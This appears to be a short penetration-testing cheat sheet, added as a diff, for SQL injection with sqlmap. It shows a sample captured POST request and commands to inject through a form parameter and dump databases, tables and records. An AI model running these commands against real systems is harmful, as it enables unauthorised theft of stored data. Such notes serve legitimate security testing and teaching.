@@ -1,0 +1,53 @@
+
+
+########################################################################################################################
+
+	DUMP REQUEST FILES
+	
+	Capture HTPP/s Request
+	Copy & Store it in a file
+	
+	For Example
+		+---------------------------------------------req-----------------------------------------------+
+		| POST /vulnerable-page.php HTTP/1.1								|
+		| Host: target.com										|
+		| User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0	|
+		| Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8		|
+		| Accept-Language: en-US,en;q=0.5								|
+		| Accept-Encoding: gzip, deflate								|
+		| Content-Type: application/x-www-form-urlencoded						|
+		| Content-Length: 60										|
+		| Connection: close										|
+		| Referer: http://target.com/									|
+		| Cookie: PHPSESSID=abcd1234efgh5678ijkl9012							|
+		| Upgrade-Insecure-Requests: 1									|
+		| 												|
+		| username=hamadah										|
+		+-----------------------------------------------------------------------------------------------+
+	
+
+
+########################################################################################################################
+
+	1) INJECTION VIA PAYLOAD
+
+	sqlmap -r <req_file> -p <injectable_payload>
+		For Example:
+		sqlmap -r req -p username
+
+########################################################################################################################
+
+	2) DUMPING
+	+---------------------------------------+
+	| Dump Databases			|
+	| Dump: Databases/ Tables/ Queries	|
+	+---------------------------------------+
+	
+	sqlmap -r <req_file> --dbs
+
+	sqlmap -r <req_file> -D <db_name> --dump
+	
+	sqlmap -r <req_file> -D <db_name> -T <table_name> --dump
+	
+########################################################################################################################
+
